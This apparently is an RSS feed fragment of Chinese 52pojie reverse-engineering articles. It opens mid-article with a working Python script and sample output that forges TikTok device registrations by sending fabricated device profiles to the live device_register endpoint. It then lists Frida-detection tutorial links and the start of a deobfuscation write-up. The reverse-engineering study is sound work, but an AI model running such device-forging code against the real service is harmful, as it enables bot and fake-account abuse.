96);">"Mozilla\\/5.0 (Linux; Android 11; Pixel 2 Build\\/RP1A.201005.004.A1; wv) AppleWebKit\\/537.36 (KHTML, like Gecko) Version\\/4.0 Chrome\\/116.0.0.0 Mobile Safari\\/537.36"</span>,<br />                <span style="color: rgb(168, 255, 96);">"user_period"</span>: <span style="color: rgb(255, 115, 253);">0</span>,<br />                <span style="color: rgb(168, 255, 96);">"screen_height_dp"</span>: <span style="color: rgb(255, 115, 253);">683</span>,<br />                <span style="color: rgb(168, 255, 96);">"user_mode"</span>: -<span style="color: rgb(255, 115, 253);">1</span>,<br />                <span style="color: rgb(168, 255, 96);">"apk_last_update_time"</span>: <span style="color: rgb(255, 115, 253);">1702363135217</span>,<br />                <span style="color: rgb(168, 255, 96);">"screen_width_dp"</span>: <span style="color: rgb(255, 115, 253);">411</span>            },<br />            <span style="color: rgb(168, 255, 96);">"apk_first_install_time"</span>: <span style="color: rgb(255, 115, 253);">1697783355395</span>,<br />            <span style="color: rgb(168, 255, 96);">"is_system_app"</span>: <span style="color: rgb(255, 115, 253);">0</span>,<br />            <span style="color: rgb(168, 255, 96);">"sdk_flavor"</span>: <span style="color: rgb(168, 255, 96);">"global"</span>,<br />            <span style="color: rgb(168, 255, 96);">"guest_mode"</span>: <span style="color: rgb(255, 115, 253);">0</span>        },<br />        <span style="color: rgb(168, 255, 96);">"_gen_time"</span>: get_timestamp_in_millisecond()    }<br />    <span style="color: rgb(150, 203, 254);">return</span> gzip_compress(json.dumps(postDataObj).encode(encoding=<span style="color: rgb(168, 255, 96);">'utf-8'</span>))<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_headers</span>(md5Hash):    headers = {<br />            <span style="color: rgb(168, 255, 96);">'log-encode-type'</span>: <span style="color: rgb(168, 255, 96);">'gzip'</span>,<br />            <span style="color: rgb(168, 255, 96);">'x-tt-request-tag'</span>: <span style="color: rgb(168, 255, 96);">'t=0;n=1'</span>,<br />            <span style="color: rgb(168, 255, 96);">'sdk-version'</span>: <span style="color: rgb(168, 255, 96);">'2'</span>,<br />            <span style="color: rgb(168, 255, 96);">'X-SS-REQ-TICKET'</span>: <span style="color: rgb(168, 255, 96);">f'<span style="color: rgb(218, 239, 163);">{get_timestamp_in_millisecond()}</span>'</span>,<br />            <span style="color: rgb(168, 255, 96);">'passport-sdk-version'</span>: <span style="color: rgb(168, 255, 96);">'19'</span>,<br />            <span style="color: rgb(168, 255, 96);">'x-tt-dm-status'</span>: <span style="color: rgb(168, 255, 96);">'login=0;ct=1;rt=4'</span>,<br />            <span style="color: rgb(168, 255, 96);">'x-vc-bdturing-sdk-version'</span>: <span style="color: rgb(168, 255, 96);">'2.3.4.i18n'</span>,<br />            <span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/octet-stream;tt-data=a'</span>,<br />            <span style="color: rgb(168, 255, 96);">'X-SS-STUB'</span>: md5Hash,<br />            <span style="color: rgb(168, 255, 96);">'Host'</span>: <span style="color: rgb(168, 255, 96);">'log-va.tiktokv.com'</span>        }<br />    <span style="color: rgb(150, 203, 254);">return</span> headers<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_device_register_url</span>(openudid, cdid):<br />    url = <span style="color: rgb(168, 255, 96);">'https://log-va.tiktokv.com/service/2/device_register/?'</span> + \<br />            <span style="color: rgb(168, 255, 96);">"tt_data=a"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"ac=wifi"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"channel=googleplay"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"aid=1233"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"app_name=musical_ly"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"version_code=320503"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"version_name=32.5.3"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"device_platform=android"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"os=android"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"ab_version=32.5.3"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"ssmix=a"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"device_type=Pixel+2"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"device_brand=google"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"language=en"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"os_api=30"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"os_version=11"</span> + \<br />            <span style="color: rgb(168, 255, 96);">f"openudid=<span style="color: rgb(218, 239, 163);">{openudid}</span>"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"manifest_version_code=2023205030"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"resolution=1080*1794"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"dpi=420"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"update_version_code=2023205030"</span> + \<br />            <span style="color: rgb(168, 255, 96);">f"_rticket=<span style="color: rgb(218, 239, 163);">{get_timestamp_in_millisecond()}</span>"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"is_pad=0"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"current_region=TW"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"app_type=normal"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"timezone_name=America%2FNew_York"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"residence=TW"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"app_language=en"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"ac2=wifi5g"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"uoo=0"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"op_region=TW"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"timezone_offset=-18000"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"build_number=32.5.3"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"host_abi=arm64-v8a"</span> + \<br />            <span style="color: rgb(168, 255, 96);">"locale=en"</span> + \<br />            <span style="color: rgb(168, 255, 96);">f"ts=<span style="color: rgb(218, 239, 163);">{get_timestamp_in_second()}</span>"</span> + \<br />            <span style="color: rgb(168, 255, 96);">f"cdid=<span style="color: rgb(218, 239, 163);">{cdid}</span>"</span><br />    <span style="color: rgb(150, 203, 254);">return</span> url<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">device_register</span>():        android_id = generate_android_id()    cdid = UUID()    google_aid = UUID()    clientudid = UUID()    gzip_post_data = get_post_data(android_id, cdid, google_aid, clientudid)    ttencrypt_post_data = ttEncryptorUtil.ttEncrypt(gzip_post_data)    headers = get_headers(md5(ttencrypt_post_data))    url = get_device_register_url(android_id, cdid)    response = http_post(url, headers, ttencrypt_post_data)<br />    print(<span style="color: rgb(168, 255, 96);">f"设备注册结果:\n<span style="color: rgb(218, 239, 163);">{response}</span>"</span>)<br /><span style="color: rgb(150, 203, 254);">if</span> __name__ == <span style="color: rgb(168, 255, 96);">"__main__"</span>:<br />    device_register()</code></pre><p>结果：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;">设备注册结果:<br />{"server_time":<span style="color: rgb(255, 115, 253);">1719390270</span>,<span style="color: rgb(168, 255, 96);">"device_id"</span>:<span style="color: rgb(255, 115, 253);">7384724147647088134</span>,<span style="color: rgb(168, 255, 96);">"install_id"</span>:<span style="color: rgb(255, 115, 253);">7384724761467832069</span>,<span style="color: rgb(168, 255, 96);">"new_user"</span>:<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(168, 255, 96);">"device_id_str"</span>:<span style="color: rgb(168, 255, 96);">"7384724147647088134"</span>,<span style="color: rgb(168, 255, 96);">"install_id_str"</span>:<span style="color: rgb(168, 255, 96);">"7384724761467832069"</span>}</code></pre><p>在分析完之后虚拟机保护的强度没有想像中的那么好，在分析过的虚拟化加密强度非要分10个等级的话，VMProtect为10级、Safengine Shielden强度为9级、Themida强度9级、VProtect强度7级、Enigma Protector强度3级，而它的强度等级仅为1级。</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1938453-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 02 Jul 2024 10:48:16 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》十九、表哥，你也不想你的Frida被检测吧!(下)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140730&amp;idx=1&amp;sn=35c28447e545cfca350016102548d63b&amp;chksm=bd50a22e8a272b3820b8289e4b53222643fa91a8f1fc1a06328f73c3f2572d771cc051659d44&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140730&amp;idx=1&amp;sn=35c28447e545cfca350016102548d63b&amp;chksm=bd50a22e8a272b3820b8289e4b53222643fa91a8f1fc1a06328f73c3f2572d771cc051659d44&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-01 18:30</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=78ffc12f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLNCsVSbypkeyvJxVJ9jfEaM43L1iassucvCybbqKFFKVlYNyYILL8bNRicVC5BwtByffrq1ibpZ1W5w%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><br /></p><p><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></span></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上)</a></span></p><p><span><br /></span></p><p><span><br /></span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=a0613883&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLNCsVSbypkeyvJxVJ9jfEaOKkygzIoNNtbBDbtPXwAibXiapg8k9VjJjf4HQfKdYMe3CnK32hIbDcQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>1.了解常见frida检测<br />2.了解frida持久化hook</p><p>1.教程Demo(更新)2.jadx-gui<br />3.VS Code</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><p><span style="font-size: 15px;">阿里云PS：</span></p><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><p><span style="font-size: 15px;">哔哩哔哩：</span></p><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><p><span style="font-size: 15px;">教程开源地址：</span></p><p><span style="font-size: 15px;">https://github.com/ZJ595/AndroidReverse</span></p><p><span style="font-size: 15px;"><br /></span></p><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上)</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68); cursor: pointer;" target="_blank"></a><br /></p><p><span style="display: none; line-height: 0px;">‍</span>小菜花的frida-gadget持久化方案汇总FridaManager:Frida脚本持久化解决方案Linux系统调用(syscall)原理小菜花的frida-svc-interceptor[原创]小日本也有大安全——记一次不寻常的手游反调试，反hook分析与绕过[原创]非root环境下frida持久化的两种方式及脚本<br />多种姿势花样使用Frida注入<span style="display: none; line-height: 0px;">‍</span></p><p><span><br /></span></p><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><p><span>https://www.52pojie.cn/thread-1938862-1-1.html</span></p><p><span><br /></span></p><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1zZ421g7B7/">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 01 Jul 2024 16:37:50 +0800</pubDate>
</item>
<item>
<title>【Android 原创】控制流平坦化反混淆（春节红包活动Android高级题）</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140723&amp;idx=1&amp;sn=d0897d9a4002d3db8899409323af75fe&amp;chksm=bd50a2278a272b31bfa81c9f5a15a809008f136227a58ee3d7651f7b7024f3939f6340f20cb1&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140723&amp;idx=1&amp;sn=d0897d9a4002d3db8899409323af75fe&amp;chksm=bd50a2278a272b31bfa81c9f5a15a809008f136227a58ee3d7651f7b7024f3939f6340f20cb1&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-06-25 17:36</span> <span style="display: inline-block;">北京</span>
</p>

<p>这篇文章主要是记录Android高级题控制流平坦化反混淆的思路和一些实现，现在实现还有缺陷，另外目标并不是高级题flag的获取，因为还未分析完成，所以后续可能会重新编辑本文，进行更新。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
